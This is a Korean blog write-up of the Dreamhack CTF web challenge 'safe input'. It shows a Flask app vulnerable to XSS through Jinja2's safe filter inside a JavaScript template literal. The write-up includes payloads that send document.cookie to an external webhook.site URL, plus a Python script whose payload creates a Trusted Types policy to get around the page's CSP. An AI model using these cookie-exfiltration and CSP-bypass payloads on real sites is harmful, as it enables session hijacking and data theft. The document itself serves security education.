---
layout: single
title: "[Dreamhack] safe input write-up"
date: 2024-01-13 23:00 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] safe input

### 😊 문제 설명

- It's so safe that it can't be seen.

<br>

### ✏️ 풀이

<br>

문제 사이트에 접속해보면 /test 경로로 바로 리다이렉트 된다.

![{CA4C553B-F9C9-4834-B07B-0839DA511D0C}](/images/2025-01-11-safe-input/{CA4C553B-F9C9-4834-B07B-0839DA511D0C}.png)

<br>

app.py 소스 코드를 보면 `/` 경로로 GET 요청을 하면 `/test` 경로로 리다이렉트 하고 `/test` 경로에서는 test.html 파일을 보여주고 `text` 파라미터를 받아와서 `test` 라는 변수에 넣어 리턴해준다.

```python
@app.route("/", methods=["GET"])
def index():
    return redirect("/test")

@app.route("/test", methods=["GET"])
def intro():
    text = request.args.get("text")
    return render_template("test.html", test=text)
```

<br>

또한 아래의 `access_page` 함수와 `/report` 경로의 소스 코드를 살펴보면 `/report` 경로에서는 `text` 파라미터를 받아와서 `access_page` 함수의 인자에 넣어주고 쿠키 값에 FLAG 값을 설정한 것으로 보아 XSS 문제인 것 같다.

```python
def access_page(text, cookie={"name": "name", "value": "value"}):
    try:
        service = Service(executable_path="/chromedriver-linux64/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get(f"http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(f"http://127.0.0.1:8000/test?text={quote(text)}")
        sleep(1)
    except Exception as e:
        print(e, flush=True)
        driver.quit()
        return False
    driver.quit()
    return True

@app.route("/report", methods=["GET", "POST"])
def report():
    if request.method == "POST":
        text = request.form.get("text")
        if not text:
            return render_template("report.html", msg="fail")

        else:
            if access_page(text, cookie={"name": "flag", "value": FLAG}):
                return render_template("report.html", message="Success")
            else:
                return render_template("report.html", message="fail")
    else:
        return render_template("report.html")
```

<br>

test.html의 script 태그를 살펴보면 jinja2 템플릿을 사용하고 있는 것을 알 수 있는데, `test` 값에 `safe` 필터가 적용되어 있는 것을 볼 수 있다. 이를 찾아보면 `safe` 필터는 HTML 이스케이프 없이 출력하도록 해주어 XSS 취약점을 유발할 수 있다.

```html
<body>
    <div class="container">
        <div class="note-header">Note</div>
        <div id="content" class="note-content">Hi everyone!</div>
        <div class="note-footer">This is Test</div>
    </div>
    <script>
            const contentElement = document.getElementById('content');
            const safeInput = "Test: " + `{{test|safe}}`;
    </script>
</body>
```

<br>

app.py 소스 코드에서 봤던 것처럼 `text` 파라미터에 인자를 넣어주면 값을 `test`에 넣어주고, 백틱으로 감싸져 있기 때문에 `${alert(1)}`을 `text` 파라미터에 넣어주면 alert(1)이 실행되는 것을 볼 수 있다.

![{9DE507F1-A3B5-4972-977B-F672DAFDAFD2}](/images/2025-01-11-safe-input/{9DE507F1-A3B5-4972-977B-F672DAFDAFD2}.png)


<br>

아래와 같은 페이로드를 사용해 POST 메소드로 webhook에 document.cookie를 보내보니 요청은 오는데 에러가 발생해서 쿠키 값이 안가는 거 같다.

```text
${fetch('https://webhook.site/081276fb-f3d6-47c8-9bd2-0dac98fe8ec3', {method: 'POST', body: document.cookie})}
```

![{266D0ACF-032B-41FE-916D-FFA54DDB50C9}](/images/2025-01-11-safe-input/{266D0ACF-032B-41FE-916D-FFA54DDB50C9}.png)

<br>

그래서 아래와 같이 GET 메소드로 바꿔 보내보면 임의로 설정한 쿠키 값이 보내진다. 그리고 report 페이지에서 입력하고 보내보니 Fail이 뜬다. 아마 Console 창에 나타난 오류 때문인 것 같다.

```text
${fetch(`https://webhook.site/081276fb-f3d6-47c8-9bd2-0dac98fe8ec3?cookie=${document.cookie}`)}
```

![{5C2FC581-96C3-4937-9A77-6A10C0B6A61B}](/images/2025-01-11-safe-input/{5C2FC581-96C3-4937-9A77-6A10C0B6A61B}.png)

<img src="/images/2025-01-11-safe-input/{FA02176E-80D8-4B9B-9E6C-B7CDEAFE63D1}.png" alt="{FA02176E-80D8-4B9B-9E6C-B7CDEAFE63D1}" style="zoom:50%;" />

<br>

자세히보니 test.html에 아래와 같은 CSP가 적용되어 있었다. Trusted Types 정책이 적용되어 있는데 script와 관련된 동적 콘텐츠 조작 시 반드시 Trusted Types 객체를 사용해야 한다. 보면 script 태그를 사용할 때 16007a93f75cde3710032976adfbcbab 라는 이름의 Tursted Types 객체를 사용하라고 되어 있는데  따로 설정된 정책이 없다.

```html
<meta http-equiv="Content-Security-Policy" content="require-trusted-types-for 'script'; trusted-types 16007a93f75cde3710032976adfbcbab;">
```

<br>

https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API 에서 사용하는 API를 사용해서 아래와 같이 페이로드를 작성하면 flag 값을 얻을 수 있다.

```python
from requests import post

URL = 'http://host1.dreamhack.games:9659'

payload = 'a`+"<img src=x onerror=fetch(\'https://webhook.site/081276fb-f3d6-47c8-9bd2-0dac98fe8ec3?cookie=\'+document.cookie)>";let policy=window.trustedTypes.createPolicy("16007a93f75cde3710032976adfbcbab",{createHTML:(input)=>{return input;}});contentElement.innerHTML=policy.createHTML(safeInput);//'

post(f'{URL}/report', data={"text": payload})

```

![{6438EB5F-D688-49B3-A64A-CD0079267123}](/images/2025-01-11-safe-input/{6438EB5F-D688-49B3-A64A-CD0079267123}.png)
